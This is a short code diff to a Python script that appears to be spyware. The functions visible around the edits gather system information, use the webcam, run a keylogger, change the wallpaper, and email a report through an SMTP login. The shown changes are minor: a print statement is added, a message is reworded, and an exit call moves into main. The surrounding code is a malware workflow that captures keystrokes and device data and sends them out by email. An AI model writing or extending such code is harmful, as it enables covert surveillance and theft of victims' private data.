@@ -174,6 +174,8 @@ def web_camera():
         destroyWindow("webCam")
 
 def set_wallpaper():
+    print("starting changing the wallpaper")
+
     # Constants for setting the wallpaper
     SPI_SETDESKWALLPAPER = 20
     SPIF_UPDATEINIFILE = 0x01
@@ -205,7 +207,7 @@ def send_report():
         server.starttls()
         server.login(Config.SMTP_USERNAME, Config.SMTP_PASSWORD)
         server.send_message(message)
-        print(f"Email sent at {datetime.datetime.now()}")
+        print(f"email sent at {datetime.datetime.now()}")
 
 def main():
     system_information()
@@ -216,8 +218,8 @@ def main():
     set_wallpaper()
     keys_logger()
     send_report()
-    return
+    os.system("exit")
 
 if __name__ == "__main__":
     main()
-    os.system("exit")
+    
